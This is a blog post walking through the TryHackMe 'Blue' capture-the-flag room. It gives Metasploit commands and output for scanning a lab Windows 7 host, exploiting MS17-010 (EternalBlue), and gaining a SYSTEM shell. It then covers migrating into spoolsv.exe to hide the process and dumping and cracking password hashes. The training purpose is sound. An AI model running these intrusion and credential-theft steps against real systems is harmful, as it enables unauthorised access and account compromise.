<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><link rel="icon" type="image/svg+xml" href="/favicon.svg"/><link rel="icon" type="image/png" href="/favicon.png"/><link rel="icon" type="image/x-icon" href="/favicon.ico"/><title>/dev/blog - /dev/blog - TryHackMe - Blue</title><meta name="description" content="Deploy &amp; hack into a Windows machine, leveraging common misconfigurations issues."/><link rel="canonical" href="https://joshuachp.dev//posts/2020-09-03_tryhackme_blue"/><meta name="next-head-count" content="8"/><script id="dark-theme" data-nscript="beforeInteractive">if(localStorage.theme==='Dark'||((!('theme'in localStorage)||localStorage.theme==='Auto')&&window.matchMedia('(prefers-color-scheme: dark)').matches)){document.documentElement.classList.add('dark')}</script><link rel="preload" href="/_next/static/css/5fc30b497c9bed6d.css" as="style"/><link rel="stylesheet" href="/_next/static/css/5fc30b497c9bed6d.css" data-n-g=""/><link rel="preload" href="/_next/static/css/2a1840b1c557e13c.css" as="style"/><link rel="stylesheet" href="/_next/static/css/2a1840b1c557e13c.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-2751f6424e24f776.js" defer=""></script><script src="/_next/static/chunks/framework-2c79e2a64abdb08b.js" defer=""></script><script src="/_next/static/chunks/main-f11614d8aa7ee555.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4751e1abc30929ff.js" defer=""></script><script src="/_next/static/chunks/212-6cd705c4437a57fb.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bpath%5D-cd79aeedc62188d6.js" defer=""></script><script src="/_next/static/MGRdb0XDWDkJTAj6WXjRJ/_buildManifest.js" defer=""></script><script src="/_next/static/MGRdb0XDWDkJTAj6WXjRJ/_ssgManifest.js" defer=""></script></head><body class="bg-primary-50 dark:bg-primary-900"><div id="__next"><header class="flex flex-row items-baseline justify-between gap-4 p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96"><nav class="flex flex-grow flex-row flex-wrap gap-y-4"><a title="Home page" class="mr-8" href="/"><h1 class=" text-primary-900 dark:text-primary-50 text-4xl font-extrabold tracking-tight sm:text-5xl md:text-6xl">/dev/blog</h1></a><ul class="flex flex-grow flex-row items-end justify-start gap-8"><li><a title="Posts" href="/posts"><span class="text-xl md:text-2xl text-primary-900 dark:text-primary-50 underline font-bold">Posts</span></a></li><li><a title="Notes" href="/notes"><span class="text-xl md:text-2xl text-primary-900 dark:text-primary-50  font-bold">Notes</span></a></li></ul></nav><div><button class="rounded border-t-2 border-l-2 border-r-4 border-b-4  border-primary-900 px-4 py-2 text-sm font-medium text-primary-900  hover:bg-primary-100 active:translate-y-0.5 dark:border-primary-50 dark:text-primary-50 dark:hover:bg-primary-800 "><span class="text-sm sm:text-base xl:text-lg text-primary-900 dark:text-primary-50 font-semibold">Auto</span></button></div></header><main class="flex flex-col justify-center p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96"><article class="flex max-w-full grow flex-col justify-self-start"><h1 class="mb-4 text-primary-900 dark:text-primary-50 text-4xl font-extrabold tracking-tight sm:text-5xl md:text-6xl"><span>TryHackMe - Blue</span></h1><blockquote><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>The room link can be found at</span>
<a title="" class="font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600" href="https://tryhackme.com/room/blue"><span>TryHackMe - Blue</span></a></p></blockquote><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>For this room, I will be using the Metasploit framework.</span></p><h2 class="mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl"><span>Recon</span></h2><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>We begin with a Nmap of the box to see the services and get their version.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>msf5 &gt; db_nmap -sC -sV 10.10.47.219
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Now we can see all the running services with the </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">services</code><span> command.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>msf5 &gt; services
Services
========

host           port   proto  name               state  info
----           ----   -----  ----               -----  ----
10.10.47.219   135    tcp    msrpc              open   Microsoft Windows RPC
10.10.47.219   139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
10.10.47.219   445    tcp    microsoft-ds       open   Windows 7 Professional 7601 Service Pack 1 microsoft-ds workgroup: WORKGROUP
10.10.47.219   3389   tcp    ssl/ms-wbt-server  open
10.10.47.219   49152  tcp    msrpc              open   Microsoft Windows RPC
10.10.47.219   49153  tcp    msrpc              open   Microsoft Windows RPC
10.10.47.219   49154  tcp    msrpc              open   Microsoft Windows RPC
10.10.47.219   49158  tcp    msrpc              open   Microsoft Windows RPC
10.10.47.219   49160  tcp    msrpc              open   Microsoft Windows RPC

</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>On this machine, we will focus on the </span><strong><span>SMB</span></strong><span> service which is on port </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">445</code><span>.</span></p><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>We can gather more information using the module</span>
<code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">auxiliary/scanner/smb/smb_version</code><span>. Running it the services page will lock</span>
<span>more like this.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>10.10.47.219  445    tcp    smb                open   Windows 7 Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP ) (signatures:optional)
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Also we run </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">auxiliary/scanner/smb/smb1</code><span> to check if the box has support for</span>
<span>SMBv1.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>msf5 auxiliary(scanner/smb/smb1) &gt; run

[+] 10.10.47.219:445      - 10.10.47.219 supports SMBv1 dialect.
[*] 10.10.47.219:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>As the machine name implies the box could be exploitable via </span><strong><span>EternalBlue</span></strong><span>.</span>
<span>Since the machine has </span><strong><span>Windows 7</span></strong><span> installed and </span><strong><span>SMBv1</span></strong><span> enabled, it is most</span>
<span>likely vulnerable. You can read more here</span>
<a title="" class="font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600" href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010"><span>Microsoft - EternalBlue</span></a><span>.</span></p><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>We can check if the machine is vulnerable by running the module</span>
<code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">auxiliary/scanner/smb/smb_ms17_010</code><span>.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run

[+] 10.10.47.219:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.47.219:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

</span></code></pre>&lt;!--more--&gt;
<h2 class="mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl"><span>Gain Access</span></h2><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Now we search for an exploit we can use in Metasploit.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>msf5 &gt; search ms17_010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution

</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Select it using </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">use 2</code><span>, set </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">LHOST</code><span> and </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">RHOST</code><span>, and run it. The exploit could</span>
<span>fail multiple times. But if you continue trying it will succeed. You could also</span>
<span>try setting the payload to </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">generic/shell_reverce_tcp</code><span>.</span></p><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Now we have a meterpreter session on the box.</span></p><h2 class="mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl"><span>Escalate</span></h2><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>If you have a simple shell you can use the</span>
<code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">post/multi/manage/shell_to_meterpreter</code><span> module to upgrade your shell.</span></p><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>If you have a meterpreter shell you can check who you are with:</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
</span></code></pre><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Since we are </span><strong><span>NT AUTHORITY\SYSTEM</span></strong><span> we have full administrator access to the</span>
<span>box. With this privilege, we can migrate our process to </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">spoolsv.exe</code><span> to hide</span>
<span>our process. We can use </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">ps</code><span> and </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">migrate</code><span> command for this. Alternatively, we</span>
<span>can use </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">run post/windows/manage/migrate</code><span> to spawn a </span><em><span>notepad</span></em><span> process and</span>
<span>migrate to it.</span></p><h2 class="mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl"><span>Cracking</span></h2><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>To crack the passwords first we need to dump them. There are two ways to do</span>
<span>this, we can use the </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">hashdump</code><span> command and crack them outside of Metasploit.</span>
<span>Else we can run the post module </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">use post/windows/gather/hashdump</code><span> this will</span>
<span>save the hashes in the database. Then we run</span>
<code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">use auxiliary/analyze/crack_windows</code><span> to crack them with </span><strong><span>john</span></strong><span>. The</span>
<span>challenge suggests us to use the wordlist </span><strong><span>rockyou.txt</span></strong><span>.</span></p><h2 class="mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl"><span>Find flags</span></h2><p class="mb-4 inline text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>To find the flag you can use the </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">search</code><span> command with the file name from the</span>
<span>root directory.</span></p><pre class="language-bash mb-4 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>meterpreter &gt; search -f flag*
</span></code></pre></article></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"path":"2020-09-03_tryhackme_blue","article":{"title":"TryHackMe - Blue","description":"Deploy \u0026 hack into a Windows machine, leveraging common misconfigurations issues.","tags":["CTF","THM"],"date":"2020-09-03","draft":false,"language":null,"content":[{"Start":{"Heading":["H1",null,[]]}},{"Text":"TryHackMe - Blue"},{"End":{"Heading":["H1",null,[]]}},{"Start":"BlockQuote"},{"Start":"Paragraph"},{"Text":"The room link can be found at"},"SoftBreak",{"Start":{"Link":["Inline","https://tryhackme.com/room/blue",""]}},{"Text":"TryHackMe - Blue"},{"End":{"Link":["Inline","https://tryhackme.com/room/blue",""]}},{"End":"Paragraph"},{"End":"BlockQuote"},{"Start":"Paragraph"},{"Text":"For this room, I will be using the Metasploit framework."},{"End":"Paragraph"},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Recon"},{"End":{"Heading":["H2",null,[]]}},{"Start":"Paragraph"},{"Text":"We begin with a Nmap of the box to see the services and get their version."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"msf5 \u003e db_nmap -sC -sV 10.10.47.219\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"Now we can see all the running services with the "},{"Code":"services"},{"Text":" command."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"msf5 \u003e services\nServices\n========\n\nhost           port   proto  name               state  info\n----           ----   -----  ----               -----  ----\n10.10.47.219   135    tcp    msrpc              open   Microsoft Windows RPC\n10.10.47.219   139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn\n10.10.47.219   445    tcp    microsoft-ds       open   Windows 7 Professional 7601 Service Pack 1 microsoft-ds workgroup: WORKGROUP\n10.10.47.219   3389   tcp    ssl/ms-wbt-server  open\n10.10.47.219   49152  tcp    msrpc              open   Microsoft Windows RPC\n10.10.47.219   49153  tcp    msrpc              open   Microsoft Windows RPC\n10.10.47.219   49154  tcp    msrpc              open   Microsoft Windows RPC\n10.10.47.219   49158  tcp    msrpc              open   Microsoft Windows RPC\n10.10.47.219   49160  tcp    msrpc              open   Microsoft Windows RPC\n\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"On this machine, we will focus on the "},{"Start":"Strong"},{"Text":"SMB"},{"End":"Strong"},{"Text":" service which is on port "},{"Code":"445"},{"Text":"."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"We can gather more information using the module"},"SoftBreak",{"Code":"auxiliary/scanner/smb/smb_version"},{"Text":". Running it the services page will lock"},"SoftBreak",{"Text":"more like this."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"10.10.47.219  445    tcp    smb                open   Windows 7 Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP ) (signatures:optional)\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"Also we run "},{"Code":"auxiliary/scanner/smb/smb1"},{"Text":" to check if the box has support for"},"SoftBreak",{"Text":"SMBv1."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"msf5 auxiliary(scanner/smb/smb1) \u003e run\n\n[+] 10.10.47.219:445      - 10.10.47.219 supports SMBv1 dialect.\n[*] 10.10.47.219:445      - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"As the machine name implies the box could be exploitable via "},{"Start":"Strong"},{"Text":"EternalBlue"},{"End":"Strong"},{"Text":"."},"SoftBreak",{"Text":"Since the machine has "},{"Start":"Strong"},{"Text":"Windows 7"},{"End":"Strong"},{"Text":" installed and "},{"Start":"Strong"},{"Text":"SMBv1"},{"End":"Strong"},{"Text":" enabled, it is most"},"SoftBreak",{"Text":"likely vulnerable. You can read more here"},"SoftBreak",{"Start":{"Link":["Inline","https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010",""]}},{"Text":"Microsoft - EternalBlue"},{"End":{"Link":["Inline","https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010",""]}},{"Text":"."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"We can check if the machine is vulnerable by running the module"},"SoftBreak",{"Code":"auxiliary/scanner/smb/smb_ms17_010"},{"Text":"."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"msf5 auxiliary(scanner/smb/smb_ms17_010) \u003e run\n\n[+] 10.10.47.219:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)\n[*] 10.10.47.219:445      - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Html":"\u003c!--more--\u003e\n"},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Gain Access"},{"End":{"Heading":["H2",null,[]]}},{"Start":"Paragraph"},{"Text":"Now we search for an exploit we can use in Metasploit."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"msf5 \u003e search ms17_010\n\nMatching Modules\n================\n\n   #  Name                                           Disclosure Date  Rank     Check  Description\n   -  ----                                           ---------------  ----     -----  -----------\n   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\n   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection\n   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+\n   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"Select it using "},{"Code":"use 2"},{"Text":", set "},{"Code":"LHOST"},{"Text":" and "},{"Code":"RHOST"},{"Text":", and run it. The exploit could"},"SoftBreak",{"Text":"fail multiple times. But if you continue trying it will succeed. You could also"},"SoftBreak",{"Text":"try setting the payload to "},{"Code":"generic/shell_reverce_tcp"},{"Text":"."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"Now we have a meterpreter session on the box."},{"End":"Paragraph"},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Escalate"},{"End":{"Heading":["H2",null,[]]}},{"Start":"Paragraph"},{"Text":"If you have a simple shell you can use the"},"SoftBreak",{"Code":"post/multi/manage/shell_to_meterpreter"},{"Text":" module to upgrade your shell."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"If you have a meterpreter shell you can check who you are with:"},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"meterpreter \u003e getuid\nServer username: NT AUTHORITY\\SYSTEM\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"Since we are "},{"Start":"Strong"},{"Text":"NT AUTHORITY\\SYSTEM"},{"End":"Strong"},{"Text":" we have full administrator access to the"},"SoftBreak",{"Text":"box. With this privilege, we can migrate our process to "},{"Code":"spoolsv.exe"},{"Text":" to hide"},"SoftBreak",{"Text":"our process. We can use "},{"Code":"ps"},{"Text":" and "},{"Code":"migrate"},{"Text":" command for this. Alternatively, we"},"SoftBreak",{"Text":"can use "},{"Code":"run post/windows/manage/migrate"},{"Text":" to spawn a "},{"Start":"Emphasis"},{"Text":"notepad"},{"End":"Emphasis"},{"Text":" process and"},"SoftBreak",{"Text":"migrate to it."},{"End":"Paragraph"},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Cracking"},{"End":{"Heading":["H2",null,[]]}},{"Start":"Paragraph"},{"Text":"To crack the passwords first we need to dump them. There are two ways to do"},"SoftBreak",{"Text":"this, we can use the "},{"Code":"hashdump"},{"Text":" command and crack them outside of Metasploit."},"SoftBreak",{"Text":"Else we can run the post module "},{"Code":"use post/windows/gather/hashdump"},{"Text":" this will"},"SoftBreak",{"Text":"save the hashes in the database. Then we run"},"SoftBreak",{"Code":"use auxiliary/analyze/crack_windows"},{"Text":" to crack them with "},{"Start":"Strong"},{"Text":"john"},{"End":"Strong"},{"Text":". The"},"SoftBreak",{"Text":"challenge suggests us to use the wordlist "},{"Start":"Strong"},{"Text":"rockyou.txt"},{"End":"Strong"},{"Text":"."},{"End":"Paragraph"},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Find flags"},{"End":{"Heading":["H2",null,[]]}},{"Start":"Paragraph"},{"Text":"To find the flag you can use the "},{"Code":"search"},{"Text":" command with the file name from the"},"SoftBreak",{"Text":"root directory."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"meterpreter \u003e search -f flag*\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}}]}},"__N_SSG":true},"page":"/posts/[path]","query":{"path":"2020-09-03_tryhackme_blue"},"buildId":"MGRdb0XDWDkJTAj6WXjRJ","runtimeConfig":{"domain":"joshuachp.dev"},"isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>